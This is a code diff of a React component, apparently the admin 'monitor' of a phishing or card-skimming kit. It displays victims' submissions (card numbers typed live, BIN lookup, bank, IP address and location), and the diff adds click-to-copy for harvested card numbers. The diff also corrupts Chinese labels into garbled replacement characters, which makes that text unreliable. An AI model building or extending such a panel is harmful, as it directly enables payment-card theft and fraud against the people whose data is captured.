@@ -85,7 +85,7 @@ const submissionData: UserSubmission[] = [
     sessionId: "sess_abc123",
     binLookup: {
       cardType: "credit",
-      bank: "中国银行",
+      bank: "��国银行",
       country: "CN"
     },
     realtimeInput: {
@@ -384,11 +384,15 @@ export function WebMonitor() {
                       </span>
                     </div>
 
-                    <div className={`text-sm font-mono border rounded px-2 py-1 min-w-[140px] transition-all duration-75 ${
-                      isFieldTyping(submission.id, 'cardNumber')
-                        ? 'border-green-400 bg-green-50 shadow-md ring-2 ring-green-200 scale-[1.02]'
-                        : 'border-gray-300 bg-gray-50'
-                    }`}>
+                    <div
+                      className={`text-sm font-mono border rounded px-2 py-1 min-w-[140px] transition-all duration-75 cursor-pointer hover:bg-blue-50 ${
+                        isFieldTyping(submission.id, 'cardNumber')
+                          ? 'border-green-400 bg-green-50 shadow-md ring-2 ring-green-200 scale-[1.02]'
+                          : 'border-gray-300 bg-gray-50'
+                      } ${copiedField?.includes('cardNumber') ? 'ring-2 ring-blue-400 bg-blue-100' : ''}`}
+                      onClick={() => copyToClipboard(getFieldValue(submission.id, 'cardNumber'), '卡号')}
+                      title="点击复制卡号"
+                    >
                       <span className="relative">
                         {getFieldValue(submission.id, 'cardNumber')}
                         {isFieldTyping(submission.id, 'cardNumber') && (
@@ -461,7 +465,7 @@ export function WebMonitor() {
                       <span className="font-medium">{submission.userLocation}</span>
                     </div>
                     <div>
-                      <span className="text-muted-foreground">IP地址: </span>
+                      <span className="text-muted-foreground">IP地���: </span>
                       <span className="font-medium">{submission.ipAddress}</span>
                     </div>
                     <div>
